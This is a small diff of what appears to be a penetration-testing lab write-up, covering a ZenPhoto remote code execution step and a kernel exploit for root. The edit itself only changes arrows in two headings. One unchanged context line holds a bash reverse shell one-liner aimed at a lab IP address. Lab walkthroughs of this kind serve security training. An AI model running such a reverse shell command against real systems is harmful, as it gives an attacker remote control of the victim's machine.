@@ -19,7 +19,7 @@ PORT     STATE SERVICE
 
 Of all things, Telnet is open.&#x20;
 
-### Web Enum --> ZenPhoto RCE
+### Web Enum -> ZenPhoto RCE
 
 Port 80 just shows this:
 
@@ -80,7 +80,7 @@ bash -c 'bash -i >& /dev/tcp/192.168.45.164/4444 0>&1'
 
 ## Privilege Escalation
 
-### Kernel Exploit --> Root
+### Kernel Exploit -> Root
 
 This machine was running on a really old Linux kernel version:
 
